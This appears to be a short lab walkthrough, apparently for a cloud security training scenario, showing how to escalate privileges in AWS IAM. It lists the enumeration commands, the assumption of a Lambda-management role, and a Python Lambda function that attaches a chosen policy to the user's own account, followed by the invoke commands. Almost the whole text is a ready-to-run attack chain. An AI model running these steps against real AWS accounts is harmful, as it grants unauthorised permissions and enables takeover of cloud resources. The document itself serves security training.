`aws configure --profile scenario7_<user_id>`

`aws iam list-attached-user-policies --user-name <username_from_mail> --profile scenario7_<user_id>`

`aws iam get-policy-version --policy-arn <user-policy arn> --version-id v1 --profile scenario7_<user_id>`

`aws iam list-roles --profile scenario7_<user_id>`

`aws iam list-attached-role-policies --role-name LamdaExecution-role-<user_id> --profile scenario7_<user_id>`

`aws iam list-attached-role-policies --role-name LambdaManager-role-<username_from_mail> --profile scenario7_<user_id>`

`aws iam get-policy-version --policy-arn <LambdaManager-policy arn> --version-id v1 --profile scenario7_<user_id>`

`aws sts assume-role --role-arn <LambdaManager-role arn> --role-session-name LambdaManager --profile scenario7_<user_id>`


Then add the lambdaManager credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:

```
[lambdaManager]
aws_access_key_id = {{AccessKeyId}}
aws_secret_access_key = {{SecretAccessKey}}
aws_session_token = {{SessionToken}}
```

python code:

**Note**: The name of the file needs to be `lambda_function.py`.

````
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName = '<username_from_mail>', PolicyArn='<arn_from_mail>')
	return response
````
**Note**: The function name needs to be `Sc7FinalLambda<userid>`.
`aws lambda create-function --function-name Sc7FinalLambda<userid> --runtime python3.6 --role < LamdaExecution-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager`

`aws lambda invoke --function-name Sc7FinalLambda<userid> out.txt --profile lambdaManager`
# If you have error try to use

`aws lambda invoke --function-name Sc7FinalLambda<userid> --profile lambdaManager --cli-binary-format raw-in-base64-out response.json`

`aws s3 ls --profile scenario7_<user_id>`
